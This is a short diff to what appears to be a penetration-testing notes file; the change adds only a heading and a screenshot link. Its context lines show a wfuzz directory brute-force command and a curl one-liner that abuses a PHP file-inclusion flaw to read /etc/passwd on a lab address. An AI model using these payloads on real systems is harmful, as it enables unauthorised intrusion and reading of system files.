@@ -118,6 +118,9 @@ wfuzz -c --hw=0 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medi
 ```s
 curl -s -X GET "http://10.10.10.10/login.php?login=php://filter/convert.base64-encode/resource=/etc/passwd" | base64 -d; echo
 ```
+#### Curl investigate service
+![image](https://user-images.githubusercontent.com/19478700/227300117-5b7729d2-89fa-4e3d-a173-3eddd182b8f7.png)
+
 ## Online tools
 whatweb
 whappalizer
